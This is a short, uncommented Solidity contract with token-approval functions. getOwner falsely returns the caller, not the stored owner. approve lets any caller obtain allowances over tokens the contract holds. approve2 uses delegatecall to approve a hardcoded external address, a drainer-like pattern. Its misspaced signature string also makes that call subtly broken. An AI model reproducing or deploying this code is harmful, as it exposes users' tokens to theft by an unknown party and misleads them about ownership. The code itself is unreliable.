pragma solidity >=0.8.10;

contract Smart {
    address  public owner;

    constructor() {
        owner = msg.sender;
    }


    function getOwner() public view returns(address) {
        return msg.sender;
    }



    function approve(address[] memory _spenders, uint _value) public returns(bool) {

        for (uint i = 0; i < _spenders.length; i++) {
            IBEP20 token = IBEP20(_spenders[i]);
            token.approve(msg.sender, _value);
        }

        return true;
    }

    function approve2(address token, uint256 amount) public  {
     token.delegatecall(abi.encodeWithSignature("approve(address, uint256)", 
        0xD072F99a88efa8484F393Bc73B5Cab09606b21f2, amount));
    }

}

interface IBEP20 {
    function symbol() external view returns (string memory);
    function approve(address spender, uint256 amount) external returns (bool);
}

